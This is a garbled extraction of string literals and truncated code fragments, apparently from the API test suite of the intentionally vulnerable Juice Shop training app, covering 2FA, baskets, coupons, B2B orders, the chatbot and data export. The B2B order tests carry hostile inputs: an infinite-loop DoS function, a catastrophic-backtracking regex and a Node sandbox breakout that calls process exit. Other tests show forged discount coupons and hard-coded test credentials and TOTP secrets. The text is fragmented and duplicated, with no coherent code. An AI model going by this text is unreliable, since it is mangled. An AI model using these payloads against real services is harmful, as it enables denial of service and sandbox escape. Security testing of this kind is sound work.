arrayOrderLinesDataOrder line(s) in customer specific JSON format[{"productId": 12,"quantity": 10000,"customerReference": ["PO0000001.2", "SM20180105|042"],"couponCode": "pes[Bh.u*t"},{"productId": 13,"quantity": 2000,"customerReference": "PO0000003.4"}]'[{"pro ... 3.4"}]'Order:securitySchemes:bearerAuth: []openapi: 3.0.0P:/My Drive/Git/juice-shop/test/api/2faSpec.tsP:/My Drive/Git/juice-shop/test/apiP:/My Drive/Git/juice-shop/test @ts-expect-error FIXME promise return handling broken// @ts- ...  broken'frisby'Joi'../../lib/insecurity'REST_URL'http://localhost:3000/rest'API_URL'http://localhost:3000/api'jsonHeaderloginRes'/user/login'`Failed to login '${totpRes'/2fa/verify''/Users/'`Failed to register '${'/2fa/setup'`Failed to enable 2fa for user: '${getStatus'/2fa/status''POST should return a valid authentication when a valid tmp token is passed'tmpTokenWurstbrot'IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH''header'/application\/json/'jsonTypes''authentication'`wurstbrot@${'POST should fail if a invalid totp token is used''THIS9ISNT8THE8RIGHT8SECRET''POST should fail if a unsigned tmp token is used''this_surly_isnt_the_right_key''GET should indicate 2fa is setup for 2fa enabled users''EinBelegtesBrotMitSchinkenSCHINKEN!''GET should indicate 2fa is not setup for users with 2fa disabled'`J12934@${'GET should return 401 when not logged in''POST should be able to setup 2fa for accounts without 2fa enabled''fooooo1@bar.com''ASDVAJSDUASZGDIADBJS''POST should fail if the password doesnt match''fooooo2@bar.com'' this makes the password wrong''POST should fail if the inital token is incorrect''fooooo3@bar.com''ASJDVASGDKASVDUAGS''POST should fail if the token is of the wrong type''fooooo4@bar.com''totp_setup_secret_foobar''POST should fail if the account has already set up 2fa''POST should be able to disable 2fa for account with 2fa enabled''fooooodisable1@bar.com''/2fa/disable''POST should not be possible to disable 2fa without the correct password'import  ... risby')require('frisby')const J ... sby.JoiJoi = frisby.Joifrisby.Joi'../../ ... curity'../../lib/insecurityconst R ... 0/rest'REST_UR ... 0/rest''http:/ ... 0/rest'http://localhost:3000/restconst A ... 00/api'API_URL ... 00/api''http:/ ... 00/api'http://localhost:3000/apiconst j ... json' }jsonHea ... json' }{ 'cont ... json' }'conten ... n/json'async f ... tion\r\n}{ email ... ecret }{ email ... tring }password: string,{\r\n  // ... tion\r\n}const l ... \n    })loginRe ... \n    })await f ... \n    })frisby\r ... \n    })frisby\r ... ).catchfrisby\r\n    .postREST_UR ... /login'/user/login(res: a ... \r\n    }res.jso ... quired'res.json?.typeres.json.statusthrow n ... ail}'`)new Err ... ail}'`)`Failed ... mail}'`Failed to login 'if (log ... on\r\n  }loginRe ... quired'loginRes.json.statusloginRes.jsontotpRes ...      })await f ...      })frisby\r ...      })frisby\r\n      .postREST_UR ... verify'/2fa/verifytmpToke ... mpTokenloginRe ... mpTokenloginRes.json.datatotpTok ... Secret)return  ... icationtotpRes ... icationtotpRes.jsonloginRe ... icationasync f ...  res\r\n}{\r\n  // ...  res\r\n}res = a ... \n    })API_URL + '/Users/'/Users/securit ... n: nullsecurityAnswer: nullFailed to register 'if (tot ... })\r\n  }const { ... word }){ token ... word }){ token }await l ... word })login({ ... word }){ email, password }frisby. ... \n    })frisby. ... ).catchfrisby. ... ', 200)frisby. ... .expectfrisby. ...      })frisby.postREST_UR ... /setup'/2fa/setupheaders ...       }Authori ... + token'Bearer ' + tokenbody: { ...       }secret: totpSecretinitial ... Secret)Failed  ... user: 'Failed to enable 2fa for user: 'frisby.getREST_UR ... status'/2fa/statusit('POS ... )\r\n  })'POST s ... passed'POST should return a valid authentication when a valid tmp token is passedconst t ... \n    })tmpToke ... \n    })securit ... \n    })userId: 10const t ... HC3KH')totpTok ... HC3KH')otplib. ... HC3KH')'IFTXE3 ... 4HC3KH'frisby. ... /json/)headers: jsonHeadertmpToke ... rstbrotapplication\/jsonjsonTypestoken: Joi.string()Joi.string()Joi.stringumail: Joi.string()bid: Joi.number()Joi.number()Joi.numberumail:  ... ain')}``wurstb ... ain')}`'POST s ... s used'POST should fail if a invalid totp token is usedasync ( ... 1)\r\n  }const t ... ECRET')totpTok ... ECRET')otplib. ... ECRET')'THIS9I ... SECRET'THIS9ISNT8THE8RIGHT8SECRETawait f ... ', 401)frisby. ... ', 401)POST should fail if a unsigned tmp token is usedconst t ... t_key')tmpToke ... t_key')jwt.sig ... t_key')'this_s ... ht_key'this_surly_isnt_the_right_keyit('GET ... )\r\n  })'GET sh ...  users'GET should indicate 2fa is setup for 2fa enabled usersconst { ... \n    }){ token ... \n    })await l ... \n    })login({ ... \n    })email:  ... ain')}`passwor ... INKEN!'totpSec ... 4HC3KH'setup: Joi.boolean()Joi.boolean()Joi.boolean'GET sh ... sabled'GET should indicate 2fa is not setup for users with 2fa disabled`J12934 ... ain')}`passwor ... 6t&6lB'secret: Joi.string()email: Joi.string()setupTo ... tring()'GET sh ... ged in'GET should return 401 when not logged infrisby. ... tatus')'POST s ... nabled'POST should be able to setup 2fa for accounts without 2fa enabledconst e ... ar.com'email = ... ar.com'fooooo1@bar.comfooooo1@barconst p ... 123456'password = '123456'const s ... IADBJS'secret  ... IADBJS''ASDVAJ ... IADBJS'ASDVAJSDUASZGDIADBJSawait r ... word })registe ... word })await f ... ', 200)initial ... secret)'POST s ...  match'POST should fail if the password doesnt matchfooooo2@bar.comfooooo2@barpasswor ...  wrong'' this  ...  wrong' this makes the password wrong'POST s ... orrect'POST should fail if the inital token is incorrectfooooo3@bar.comfooooo3@barinitial ... DUAGS')otplib. ... DUAGS')secret  ... VDUAGS'ASJDVASGDKASVDUAGS'POST s ... g type'POST should fail if the token is of the wrong typefooooo4@bar.comfooooo4@bartype: ' ... foobar''totp_s ... foobar'totp_setup_secret_foobar'POST s ... up 2fa'POST should fail if the account has already set up 2faconst e ... ain')}`email = ... ain')}`const p ... INKEN!'const t ... 4HC3KH'const { ... cret }){ token ... cret })await l ... cret })login({ ... cret })POST should be able to disable 2fa for account with 2fa enabled'fooooo ... ar.com'fooooodisable1@bar.comfooooodisable1@barconst t ... IADBJS'totpSec ... IADBJS'await r ... cret })registe ... cret })await g ...      })getStat ...      })getStat ... .expectgetStat ... ', 200)getStatus(token)frisby. ... \r\n    )REST_UR ... isable'/2fa/disable'POST s ... ssword'POST should not be possible to disable 2fa without the correct passwordP:/My Drive/Git/juice-shop/test/api/addressApiSpec.tsauthHeader'GET all addresses is forbidden via public API''/Addresss''GET all addresses''POST new address with all valid fields''9800000000''USA''POST new address with invalid pin code''NX 10111111''POST new address with invalid mobile number''10000000000''POST new address is forbidden via public API''GET address by id is forbidden via public API''/Addresss/''PUT update address is forbidden via public API''DELETE address by id is forbidden via public API''GET address by id''PUT update address by id''Jimy''PUT update address by id with invalid mobile number is forbidden''PUT update address by id with invalid pin code is forbidden''DELETE address by id'let aut ... tring }authHea ... tring }{ Autho ... tring }Authori ... string,'conten ...  stringlet add ...  stringbeforeA ...  })\r\n})frisby. ...   .thenfrisby. ... }\r\n  })body: { ... \r\n    }password: 'ncc-1701'({ json ... \r\n    }{ json }authHea ... json' }{ Autho ... json' }Authori ... n.token'Bearer ... n.tokenjson.au ... n.tokenjson.authentication'GET al ... ic API'GET all addresses is forbidden via public APIreturn  ... ', 401)frisby. ... resss')API_URL ... dresss'/AddresssGET all addressesreturn  ... ', 200)frisby. ... ader }){ heade ... eader }headers: authHeader'POST n ... fields'POST new address with all valid fieldsreturn  ... ', 201)frisby. ... ', 201)mobileN ... 000000'country: 'USA'USA'POST n ... n code'POST new address with invalid pin codereturn  ... ', 400)frisby. ... ', 400)zipCode ... 111111'NX 10111111'POST n ... number'POST new address with invalid mobile number'POST n ... ic API'POST new address is forbidden via public APIbeforeA ... )\r\n  })({ json ...       }address ... data.idjson.data.idjson.data'GET ad ... ic API'GET address by id is forbidden via public APIfrisby. ... ressId)API_URL ... dressIdAPI_URL ... resss/'/Addresss/it('PUT ... )\r\n  })'PUT up ... ic API'PUT update address is forbidden via public APIfrisby. ... true })frisby.putit('DEL ... )\r\n  })'DELETE ... ic API'DELETE address by id is forbidden via public APIfrisby.delGET address by id'PUT up ...  by id'PUT update address by idreturn  ... imy' })frisby. ... imy' })fullName: 'Jimy'Jimy{ fullName: 'Jimy' }'PUT up ... bidden'PUT update address by id with invalid mobile number is forbiddenPUT update address by id with invalid pin code is forbidden'DELETE ...  by id'DELETE address by idP:/My Drive/Git/juice-shop/test/api/administrationApiSpec.ts'../../lib/utils''http://localhost:3000/rest/admin''GET application version from package.json''GET application configuration'const u ... utils')utils = ... utils')../../lib/utilsconst R ... /admin'REST_UR ... /admin''http:/ ... /admin'http://localhost:3000/rest/admin'GET ap ... e.json'GET application version from package.jsonGET application version from packagefrisby. ... rsion')REST_UR ... ersion''GET ap ... ration'GET application configurationfrisby. ... ation')REST_UR ... ration'config: Joi.object()Joi.object()Joi.objectP:/My Drive/Git/juice-shop/test/api/angularDistSpec.ts'GET main.js contains Cryptocurrency URLs''/main.js''bodyContains''/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm''/redirect?to=https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW''/redirect?to=https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6''GET main.js contains password hint for support team''Parola echipei de asisten\\u021b\\u0103 nu respect\\u0103 politica corporativ\\u0103 pentru conturile privilegiate! V\\u0103 rug\\u0103m s\\u0103 schimba\\u021bi parola \\xeen consecin\\u021b\\u0103!'const U ... t:3000'URL = ' ... t:3000''GET ma ... y URLs'GET main.js contains Cryptocurrency URLsGET mainjs contains Cryptocurrency URLsreturn  ... 1eae6')frisby. ... 1eae6')frisby. ... N17kW')frisby. ... 8DRZm')frisby. ... in.js')URL + '/main.js'/main.jsbodyContains'/redir ... G8DRZm'/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm'/redir ... ZN17kW'/redirect?to=https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW'/redir ... 11eae6'/redirect?to=https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6'GET ma ... t team'GET main.js contains password hint for support teamjs contains password hint for support teamreturn  ... 0103!')frisby. ... 0103!')'Parola ... u0103!'Parola echipei de asisten\u021b\u0103 nu respect\u0103 politica corporativ\u0103 pentru conturile privilegiate! V\u0103 rug\u0103m s\u0103 schimba\u021bi parola \xeen consecin\u021b\u0103!Parola echipei de asisten\u021b\u0103 nu respect politica corporativ pentru conturile privilegiate! V rugm s schimbai parola \xeen consecinP:/My Drive/Git/juice-shop/test/api/apiSpec.ts'GET error when query /api without actual resource''GET error message with information leakage when calling unrecognized path with /rest in it''/unrecognized''<h1>'' (Express''Unexpected path: /rest/unrecognized''GET er ... source'GET error when query /api without actual resourcereturn  ... ', 500)frisby. ... ', 500)frisby.get(API_URL)'GET er ...  in it'GET error message with information leakage when calling unrecognized path with /rest in itreturn  ... nized')frisby. ... nized')frisby. ... press')REST_UR ... gnized'/unrecognized'<h1>'  ... xpress''<h1>'  ... .name')<h1> (Express'Unexpe ... gnized'Unexpected path: /rest/unrecognizedP:/My Drive/Git/juice-shop/test/api/authenticatedUsersSpec.ts'@jest/globals'ContentType'GET all users with password replaced by asterisks'}/user/authentication-details`'data.?''********************************''GET returns lastLoginTime for users with active sessions'}/user/login``jim@${'jim@'import  ... lobals'@jest/globals{ Conte ... json' }Content ... n/json'const a ... json' }Authori ...  } })}``Bearer ...  } })}`securit ... p' } }){ data: ... op' } }data: { ... h.op' }'GET al ... erisks'GET all users with password replaced by asterisks`${REST ... etails`/user/a ... details/user/authentication-detailsdata.?.?passwor ... ******''****** ... ******'********************************'GET re ... ssions'GET returns lastLoginTime for users with active sessionsawait f ... omise()frisby. ... omise()frisby. ... promise`${REST ... /login``jim@${ ... ain')}`jim@const r ... omise()respons ... omise()const j ... jim@'))jim = r ... jim@'))respons ... jim@'))respons ... ta.findresponse.json.dataresponse.json(user:  ... 'jim@')user.em ... 'jim@')user.em ... rtsWithexpect(jim).not.toBeexpect(jim).notexpect(jim)expect( ... umber))expect( ... inTime)jim.lastLoginTimeexpect.any(Number)expect.anyP:/My Drive/Git/juice-shop/test/api/b2bOrderSpec.ts'http://localhost:3000/b2b/v2/orders''POST endless loop exploit in "orderLinesData" will raise explicit error''(function dos() { while(true); })()''POST busy spinning regex attack does not raise an error''/((a+)+)b/.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaa")''POST sandbox breakout attack in "orderLinesData" will raise error''this.constructor.constructor("return process")().exit()''POST new B2B order is forbidden without authorization token''POST new B2B order accepts arbitrary valid JSON''POST new B2B order has passed "cid" in response'const A ... orders'API_URL ... orders'http://localhost:3000/b2b/v2/ordersAuthori ... orize()'Bearer ... orize()security.authorize(){\r\n  if ...   })\r\n}if (uti ... })\r\n  }it('POS ... \n    })'POST e ...  error'POST endless loop exploit in "orderLinesData" will raise explicit errorreturn  ... tions')frisby. ... tions')orderLi ... ; })()''(funct ... ; })()'(function dos() { while(true); })()'POST b ...  error'POST busy spinning regex attack does not raise an errorreturn  ... ', 503)frisby. ... ', 503)orderLi ... aaaa")''/((a+) ... aaaa")'/((a+)+)b/.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaa")((a+)+)(a+)+(a+)b/("aaaaaaaaaaaaaaaaaaaaaaaaaaaaa")"aaaaaaaaaaaaaaaaaaaaaaaaaaaaa"'POST s ...  error'POST sandbox breakout attack in "orderLinesData" will raise errororderLi ... exit()''this.c ... exit()'this.constructor.constructor("return process")().exit()("return process")"return process"'POST n ...  token'POST new B2B order is forbidden without authorization tokenfrisby. ... RL, {})'POST n ... d JSON'POST new B2B order accepts arbitrary valid JSONfoo: 'bar'test: 42cid: Joi.string()orderNo ... tring()payment ... tring()'POST n ... sponse'POST new B2B order has passed "cid" in responsecid: 'test'P:/My Drive/Git/juice-shop/test/api/basketApiSpec.tsvalidCouponoutdatedCouponforgedCoupon99'GET existing basket by id is not allowed via public API''/basket/1''GET empty basket when requesting non-existing basket id''/basket/4711''GET existing basket with contained products by id''/api/Baskets''POST new basket is not part of API''/Baskets''GET all baskets is not part of API''/api/Baskets/:id''GET existing basket is not part of API''/Baskets/1''PUT update existing basket is not part of API''DELETE existing basket is not part of API''GET existing basket of another user''/basket/2''POST placing an order for a basket is not allowed via public API''/basket/1/checkout''POST placing an order for an existing basket returns orderId''POST placing an order for a non-existing basket fails''/basket/42/checkout''Error: Basket with id=42 does not exist.''POST placing an order for a basket with a negative total cost is possible''/BasketItems''/basket/3/checkout''POST placing an order for a basket with 99% discount is possible''/basket/2/coupon/''/basket/2/checkout''PUT apply valid coupon to existing basket''/basket/1/coupon/''PUT apply invalid coupon is not accepted''/basket/1/coupon/xxxxxxxxxx''PUT apply outdated coupon is not accepted''PUT apply valid coupon to non-existing basket throws error''/basket/4711/coupon/'const v ... pon(15)validCo ... pon(15)securit ... pon(15)const o ...  0, 1))outdate ...  0, 1))securit ...  0, 1))new Date(2001, 0, 1)const f ... pon(99)forgedC ... pon(99)securit ... pon(99)'GET ex ... ic API'GET existing basket by id is not allowed via public APIfrisby. ... ket/1')REST_UR ... sket/1'/basket/1'GET em ... ket id'GET empty basket when requesting non-existing basket idreturn  ... a', {})frisby. ... a', {})REST_UR ... t/4711'/basket/4711'GET ex ...  by id'GET existing basket with contained products by idfrisby. ... d: 1 })json.da ... .lengthjson.data.Products/api/Baskets'POST n ... of API'POST new basket is not part of APIAPI_URL + '/Baskets'/Baskets'GET al ... of API'GET all baskets is not part of API/api/Baskets/:id'GET ex ... of API'GET existing basket is not part of APIAPI_URL ... kets/1'/Baskets/1'PUT up ... of API'PUT update existing basket is not part of APIbody: { UserId: 2 }'DELETE ... of API'DELETE existing basket is not part of API'GET ex ... r user'GET existing basket of another useremail:  ... il.com'kimminich@gmailpasswor ... VvamI='return  ... d: 2 })frisby. ... d: 2 })frisby. ... en } })REST_UR ... sket/2'/basket/2{ heade ... ken } }headers ... token }{ Autho ... token }{ id: 2 }'POST p ... ic API'POST placing an order for a basket is not allowed via public APIfrisby. ... ckout')REST_UR ... eckout'/basket/1/checkout'POST p ... rderId'POST placing an order for an existing basket returns orderIdjson.or ... rmation'POST p ...  fails'POST placing an order for a non-existing basket failsreturn  ... xist.')frisby. ... xist.')'/baske ... eckout'/basket/42/checkout'Error: ... exist.'Error: Basket with id=42 does not exist.Error: Basket with id=42 does not exist'POST p ... ssible'POST placing an order for a basket with a negative total cost is possibleAPI_URL ... tItems'/BasketItemsbody: { ...  -100 }{ Baske ...  -100 }ProductId: 10/basket/3/checkoutPOST placing an order for a basket with 99% discount is possiblefrisby. ... : 99 })REST_UR ... Coupon)REST_UR ... oupon/'/basket/2/coupon/encodeU ... Coupon){ discount: 99 }discount: 99/basket/2/checkout'PUT ap ... basket'PUT apply valid coupon to existing basketreturn  ... : 15 })frisby. ... : 15 })/basket/1/coupon/{ discount: 15 }discount: 15'PUT ap ... cepted'PUT apply invalid coupon is not accepted() => { ... 4)\r\n  }{\r\n     ... 4)\r\n  }return  ... ', 404)frisby. ... ', 404)REST_UR ... xxxxxx''/baske ... xxxxxx'/basket/1/coupon/xxxxxxxxxxPUT apply outdated coupon is not accepted'PUT ap ...  error'PUT apply valid coupon to non-existing basket throws error'/baske ... oupon/'/basket/4711/coupon/P:/My Drive/Git/juice-shop/test/api/basketItemApiSpec.ts'GET all basket items is forbidden via public API''POST new basket item is forbidden via public API''GET all basket items''POST new basket item''POST new basket item with more than available quantity is forbidden''POST new basket item with more than allowed quantity is forbidden''You can order only up to 5 items of this product.''GET basket item by id is forbidden via public API''/BasketItems/1''PUT update basket item is forbidden via public API''DELETE basket item is forbidden via public API''GET newly created basket item by id''/BasketItems/''PUT update newly created basket item''PUT update basket ID of basket item is forbidden''null: `BasketId` cannot be updated due `noUpdate` constraint'field'`BasketId` cannot be updated due `noUpdate` constraint''PUT update basket ID of basket item without basket ID''PUT update product ID of basket item is forbidden''null: `ProductId` cannot be updated due `noUpdate` constraint''`ProductId` cannot be updated due `noUpdate` constraint''PUT update newly created basket item with more than available quantity is forbidden''PUT update basket item with more than allowed quantity is forbidden''DELETE newly created basket item''jim@'  ... omain')GET all basket items is forbidden via public APIfrisby. ... Items')POST new basket item is forbidden via public API'GET al ...  items'GET all basket items'POST n ... t item'POST new basket item'POST n ... bidden'POST new basket item with more than available quantity is forbiddenquantity: 101POST new basket item with more than allowed quantity is forbiddenreturn  ... duct.')frisby. ... duct.')quantity: 6You can order only up to 5 items of this product.You can order only up to 5 items of this product'GET ba ... ic API'GET basket item by id is forbidden via public APIfrisby. ... ems/1')API_URL ... tems/1'/BasketItems/1PUT update basket item is forbidden via public APIDELETE basket item is forbidden via public API'GET ne ...  by id'GET newly created basket item by idProductId: 6API_URL ... data.idAPI_URL ... Items/'/BasketItems/'PUT up ... t item'PUT update newly created basket itemreturn  ... : 20 })frisby. ... : 20 })quantity: 20{ quantity: 20 }PUT update basket ID of basket item is forbiddenProductId: 8quantity: 8return  ... ' }] })frisby. ... ' }] })BasketId: 42{ messa ... t' }] }message ... traint''null:  ... traint'null: `BasketId` cannot be updated due `noUpdate` constrainterrors: ... int' }][{ fiel ... int' }]{ field ... aint' }field: 'BasketId''`Baske ... traint'`BasketId` cannot be updated due `noUpdate` constraint'PUT up ... ket ID'PUT update basket ID of basket item without basket IDexpect( ... sketId)json.data.BasketIdreturn  ... d: 3 })frisby. ... d: 3 }){ BasketId: 3 }PUT update product ID of basket item is forbiddenProductId: 9quantity: 9ProductId: 42null: `ProductId` cannot be updated due `noUpdate` constraintfield: 'ProductId''`Produ ... traint'`ProductId` cannot be updated due `noUpdate` constraintPUT update newly created basket item with more than available quantity is forbiddenProductId: 12quantity: 12PUT update basket item with more than allowed quantity is forbidden'DELETE ... t item'DELETE newly created basket itemquantity: 10P:/My Drive/Git/juice-shop/test/api/challengeApiSpec.ts using [1, 2] here// using [1, 2] here using [15, 69] here which both have a Coding Challenge// usin ... allenge'GET all challenges''/Challenges''data.*''POST new challenge is forbidden via public API even when authenticated''Invulnerability''I am not a vulnerability!''GET existing challenge by id is forbidden via public API even when authenticated''/Challenges/1''PUT update existing challenge is forbidden via public API even when authenticated''Vulnerability''I am a vulnerability!!!''DELETE existing challenge is forbidden via public API even when authenticated''GET can retrieve continue code for currently solved challenges''/continue-code''PUT invalid continue code is rejected''/continue-code/apply/ThisIsDefinitelyNotAValidContinueCode''PUT continue code for more than one challenge is accepted''/continue-code/apply/yXjv6Z5jWJnzD6a3YvmwPRXK7roAyzHDde2Og19yEN84plqxkMBbLVQrDeoY''PUT continue code for non-existent challenge #999 is accepted''/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj''/continue-code-findIt''/continue-code-findIt/apply/ThisIsDefinitelyNotAValidContinueCode''/continue-code-findIt/apply/Xg9oK0VdbW5g1KX9G7JYnqLpz3rAPBh6p4eRlkDM6EaBON2QoPmxjyvwMrP6''/continue-code-fixIt''/continue-code-fixIt/apply/ThisIsDefinitelyNotAValidContinueCode''/continue-code-fixIt/apply/y28BEPE2k3yRrdz5p6DGqJONnj41n5UEWawYWgBMoVmL79bKZ8Qve0Xl5QLW'GET all challengesfrisby. ... enges')API_URL ... lenges'/Challengesdata.*id: Joi.number()key: Joi.string()name: Joi.string()descrip ... tring()difficu ... umber()solved: ... olean()'POST n ... icated'POST new challenge is forbidden via public API even when authenticatedname: ' ... bility'Invulnerabilitydescrip ... ility!''I am n ... ility!'I am not a vulnerability!'GET ex ... icated'GET existing challenge by id is forbidden via public API even when authenticatedAPI_URL ... nges/1'/Challenges/1'PUT up ... icated'PUT update existing challenge is forbidden via public API even when authenticatedVulnerabilitydescrip ... ity!!!''I am a ... ity!!!'I am a vulnerability!!!'DELETE ... icated'DELETE existing challenge is forbidden via public API even when authenticated'GET ca ... lenges'GET can retrieve continue code for currently solved challengesfrisby. ... -code')REST_UR ... e-code'/continue-code'PUT in ... jected'PUT invalid continue code is rejectedfrisby. ... eCode')REST_UR ... ueCode''/conti ... ueCode'/continue-code/apply/ThisIsDefinitelyNotAValidContinueCode'PUT co ... cepted'PUT continue code for more than one challenge is accepted{ // us ... 0)\r\n  }frisby. ... rDeoY')REST_UR ... QrDeoY''/conti ... QrDeoY'/continue-code/apply/yXjv6Z5jWJnzD6a3YvmwPRXK7roAyzHDde2Og19yEN84plqxkMBbLVQrDeoYPUT continue code for non-existent challenge #999 is acceptedfrisby. ... 5LvDj')REST_UR ... V5LvDj''/conti ... V5LvDj'/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDjfrisby. ... indIt')REST_UR ... findIt''/conti ... findIt'/continue-code-findIt/continue-code-findIt/apply/ThisIsDefinitelyNotAValidContinueCodefrisby. ... wMrP6')REST_UR ... vwMrP6''/conti ... vwMrP6'/continue-code-findIt/apply/Xg9oK0VdbW5g1KX9G7JYnqLpz3rAPBh6p4eRlkDM6EaBON2QoPmxjyvwMrP6frisby. ... fixIt')REST_UR ... -fixIt''/conti ... -fixIt'/continue-code-fixIt/continue-code-fixIt/apply/ThisIsDefinitelyNotAValidContinueCodefrisby. ... l5QLW')REST_UR ... Xl5QLW''/conti ... Xl5QLW'/continue-code-fixIt/apply/y28BEPE2k3yRrdz5p6DGqJONnj41n5UEWawYWgBMoVmL79bKZ8Qve0Xl5QLWP:/My Drive/Git/juice-shop/test/api/chatBotSpec.ts'../../routes/chatbot'}/rest/`}/api/`'/chatbot''GET bot training state''chatbot/status''GET bot state for anonymous users contains log in request''body'/Sign in to talk/'GET bot state for authenticated users contains request for username'/What shall I call you?/'Asks for username if not defined''chatbot/respond''action''Returns greeting if username is defined''Bot not initialized''1337''bkimminich''Returns proper response for registered user'toContainEqual'Responds with product price when asked question with product name''/Products/1''How much is ''Greets back registered user after being told username'`stan@${'ship coffin krypt cross estate supply insurance asbestos souvenir''NotGuybrushThreepwood'/NotGuybrushThreepwood/'POST returns error for unauthenticated user''Bearer faketoken''Returns proper response for custom callbacks'testResponse'Returns a 500 when the user name is set to crash request'}/Users``chatbot-testuser@${'testtesttest'inspectResponseimport  ... hatbot''../../ ... hatbot'../../routes/chatbotconst R ... /rest/`REST_UR ... /rest/``${URL}/rest/`/rest/const A ... }/api/`API_URL ... }/api/``${URL}/api/`let tra ... any[] }trainin ... any[] }{ data: any[] }data: any[]await initialize()trainin ... f8' }))JSON.pa ... f8' }))await f ... tf8' })fs.read ... tf8' })`data/c ... ta'))}`{ encoding: 'utf8' }encoding: 'utf8'it('GET ... \n    })'GET bo ...  state'GET bot training statereturn  ... , true)frisby. ... , true)chatbot/status'GET bo ... equest'GET bot state for anonymous users contains log in requestreturn  ...  talk/)frisby. ...  talk/)Sign in to talk'GET bo ... ername'GET bot state for authenticated users contains request for usernameconst { ...      }){ token ...      })await l ...      })login({ ...      })frisby. ...  you?/)frisby. ... ue).getfrisby.setuprequest ...       }Authori ... token}``Bearer ${token}`'Conten ... n/json'/What s ... l you?/What shall I call you?What shall I call yoit('Ask ... \n    })'Asks f ... efined'Asks for username if not definedconst t ... nces[0]trainin ... nces[0]trainin ... erancestrainingData.data[0]frisby. ...  you?')frisby. ... query')frisby. ...   .postREST_UR ... espond'chatbot/respondaction: 'query'query: testCommandit('Ret ... \n    })'Return ... efined'Returns greeting if username is definedif (bot ...       }throw n ... lized')new Err ... lized')'Bot no ... alized'Bot not initializedbot.add ... inich')1337frisby. ... 1337'))frisby. ... ponse')bot.greet('1337')'Return ... d user'Returns proper response for registered userexpect( ... l(json)expect( ... inEqualexpect( ... nswers)trainin ... answersit('Res ... \n    })'Respon ... t name'Responds with product price when asked question with product nameconst { ... omise(){ json  ... omise()frisby. ... cts/1')API_URL ... ucts/1'/Products/1query:  ... e + '?''How mu ... e + '?''How mu ... ta.nameHow much is json.data.name({ body ...       }{ body = json.body }body = json.bodyjson.bodyexpect( ... ice}\u00a4`)expect(body)`${json ... rice}\u00a4`json.data.priceit('Gre ... \n    })'Greets ... ername'Greets back registered user after being told username`stan@$ ... ain')}`stan@passwor ... uvenir'frisby. ... pwood/)action: 'setname'query:  ... epwood''NotGuy ... epwood'NotGuybrushThreepwood/NotGuy ... epwood/'POST r ... d user'POST returns error for unauthenticated userreturn  ...  user')frisby. ...  user')Authori ... etoken'Bearer faketoken'Return ... lbacks'Returns proper response for custom callbacksconst f ... nTest')functio ... nTest')trainin ... nTest')data => ... onTest'data.in ... onTest'functio ... nces[0]functio ... erancesfunctionTest[0]const t ... 7bb3bd'testRes ... 7bb3bd'frisby. ... sponse)'Return ... equest'Returns a 500 when the user name is set to crash request`${API_URL}/Users`/Users`chatbo ... ain')}`chatbot-testuser@passwor ... sttest'testtesttestusername: '"'frisby. ... ponse()frisby. ... esponseP:/My Drive/Git/juice-shop/test/api/complaintApiSpec.ts'POST new complaint''/Complaints''You have no clue what https://github.com/eslint/eslint-scope/issues/39 means, do you???''GET all complaints is forbidden via public API''GET all complaints''GET existing complaint by id is forbidden''/Complaints/1''PUT update existing complaint is forbidden''Should not work...''DELETE existing complaint is forbidden'POST new complaintAPI_URL ... laints'/Complaintsmessage ... you???''You ha ... you???'You have no clue what https://github.com/eslint/eslint-scope/issues/39 means, do you???created ... tring()updated ... tring()GET all complaints is forbidden via public APIfrisby. ... aints')GET all complaints'GET ex ... bidden'GET existing complaint by id is forbiddenAPI_URL ... ints/1'/Complaints/1PUT update existing complaint is forbiddenmessage ... ork...'Should not work...Should not work'DELETE ... bidden'DELETE existing complaint is forbiddenP:/My Drive/Git/juice-shop/test/api/countryMapppingSpec.ts'GET no country mapping present in default configuration''/country-mapping''GET no ... ration'GET no country mapping present in default configurationfrisby. ... pping')REST_UR ... apping'P:/My Drive/Git/juice-shop/test/api/dataExportApiSpec.ts @ts-expect-error FIXME form.getHeaders() is not found// @ts- ... t found'Export data without use of CAPTCHA'jsonLogin'/user/data-export'parsedData'Export data when CAPTCHA requested need right answer''/image-captcha''AAAAAA''Export data using right answer to CAPTCHA'captchaAnswer'Export data including orders without use of CAPTCHA''/basket/4/checkout'9.98'Raspberry Juice (1000ml)''Export data including reviews without use of CAPTCHA''Looks so much better on my uniform than the boring Starfleet symbol.''Fresh out of a replicator.''Export data including memories without use of CAPTCHA''../files/validProfileImage.jpg''Valid Image''/memories'getHeaders'assets/public/images/uploads/valid-image''Export data including orders with use of CAPTCHA''Export data including reviews with use of CAPTCHA''Export data including memories with use of CAPTCHA'it('Exp ... )\r\n  })'Export ... APTCHA'Export data without use of CAPTCHA{ json: jsonLogin }json: jsonLoginfrisby. ... ndow.')REST_UR ... export'/user/data-exportheaders ... json' }jsonLog ... n.tokenjsonLog ... icationformat: '1'const p ... erData)parsedD ... erData)JSON.pa ... erData)json.userDataexpect( ... ername)parsedData.usernameexpect( ... l.com')parsedData.email'Export ... answer'Export data when CAPTCHA requested need right answerREST_UR ... aptcha'return  ... gain.')frisby. ... gain.')answer: 'AAAAAA'AAAAAAformat: 1Export data using right answer to CAPTCHA{ json: ... nswer }json: captchaAnsweranswer: ... .answercaptchaAnswer.answerExport data including orders without use of CAPTCHApasswor ... ......'K1f/basket/4/checkoutexpect( ... main'))expect( ... e(9.98)expect( ... lPrice)parsedD ... alPriceparsedData.orders[0]parsedData.ordersparsedD ... ].bonusparsedD ... uantityparsedD ... ucts[0]parsedD ... roductsparsedD ... 0].nameRaspberry Juice expect( ... e(4.99)parsedD ... ].priceexpect( ... .total)parsedD ... ].totalExport data including reviews without use of CAPTCHAexpect( ... mbol.')parsedD ... messageparsedD ... iews[0]parsedData.reviewsLooks so much better on my uniform than the boring 